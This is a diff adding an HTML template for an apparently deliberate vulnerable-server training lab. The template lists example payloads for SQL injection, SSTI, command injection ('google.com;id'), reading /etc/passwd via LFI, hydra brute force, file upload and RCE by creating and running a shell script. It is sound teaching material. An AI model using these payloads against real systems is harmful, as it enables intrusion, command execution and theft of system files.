@@ -1,0 +1,118 @@
+{% extends "base.html" %}
+
+{% block title %}Vulnerability Scenarios{% endblock %}
+
+{% block content %}
+<div class="bg-white rounded shadow p-4">
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">Link To Vulnerable Server</h2>
+        <div class="p-4 bg-blue-500 rounded-lg text-center text-white">
+            <a href="{{ url_for('linkserver') }}" target="_blank" class="text-lg font-semibold hover:underline">Link To Vulnerable
+                Server</a>
+        </div>
+    </div>
+    <h1 class="text-3xl font-bold mb-4">Vulnerability Scenarios</h1>
+    <p> Hello! Please note that you are permitted to conduct penetration testing on the server. However, you must
+        refrain from causing permanent damage or
+        disrupting the server's availability beyond temporary Denial of Service (DoS) testing, which is allowed for
+        assessment purposes.</p>
+    <!-- SQL Injection -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">SQL Injection</h2>
+        <p class="mb-4">Exploiting a SQL injection vulnerability by injecting:</p>
+        <code class="bg-gray-100 p-2 block">
+                /user/'%20r%20'1=1
+            </code>
+    </div>
+
+    <!-- HTML Injection -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">HTML Injection</h2>
+        <p class="mb-4">Injecting malicious HTML code:</p>
+        <code class="bg-gray-100 p-2 block">
+                /welcome2/&lt;h1&gt;test
+            </code>
+    </div>
+
+    <!-- SSTI -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">SSTI (Server-Side Template Injection)</h2>
+        <p class="mb-4">Exploiting SSTI with various payloads:</p>
+        <code class="bg-gray-100 p-2 block">
+                <li>/hello?name=test</li>
+                <li>/hello?name={7*7}</li>
+                <li>/hello?name={7*7}</li>
+                <li>
+                    /hello?name=&#123;&#123;config.items()&#125;&#125;
+                </li>
+            </code>
+    </div>
+
+    <!-- Command Injection -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">Command Injection</h2>
+        <p class="mb-4">Exploiting a command injection vulnerability:</p>
+        <code class="bg-gray-100 p-2 block">
+                /get_users?hostname=google.com;id
+            </code>
+    </div>
+
+    <!-- Information Disclosure -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">Information Disclosure</h2>
+        <p class="mb-4">Revealing sensitive information:</p>
+        <code class="bg-gray-100 p-2 block">
+                <li>/get_log/</li>
+                <li>/get_admin_mail/admin</li>
+            </code>
+    </div>
+
+    <!-- LFI (Local File Inclusion) -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">LFI (Local File Inclusion)</h2>
+        <p class="mb-4">Exploiting LFI:</p>
+        <code class="bg-gray-100 p-2 block">
+                /read_file?filename=/etc/passwd
+            </code>
+    </div>
+
+    <!-- Brute Force -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">Brute Force</h2>
+        <p class="mb-4">Attempting brute force attacks with status codes:</p>
+        <code class="bg-gray-100 p-2 block">
+                <li>code 403 = error login</li>
+                <li>code 200 = correct login</li>
+            </code>
+        <p class="mb-4">Using hydra for brute force.</p>
+    </div>
+
+    <!-- File Upload -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">File Upload</h2>
+        <p class="mb-4">Uploading arbitrary files, posing a potential security risk:</p>
+        <code class="bg-gray-100 p-2 block">
+                You can upload any file, I'm sure you can figure something out..
+            </code>
+    </div>
+
+    <!-- DOS (Denial of Service) -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">DOS (Denial of Service)</h2>
+        <p class="mb-4">Creating a Denial of Service attack scenario:</p>
+        <code class="bg-gray-100 p-2 block">
+                /user_pass_control?username=1&password=2
+            </code>
+    </div>
+
+    <!-- RCE (Remote Code Execution) -->
+    <div class="mb-8">
+        <h2 class="text-2xl font-bold">RCE (Remote Code Execution)</h2>
+        <p class="mb-4">Exploiting Remote Code Execution vulnerabilities:</p>
+        <code class="bg-gray-100 p-2 block">
+            <li>/create_file?filename=2.sh&text=id</li>
+            <li>/run_file?filename=2.sh</li>
+        </code>
+    </div>
+</div>
+{% endblock %}
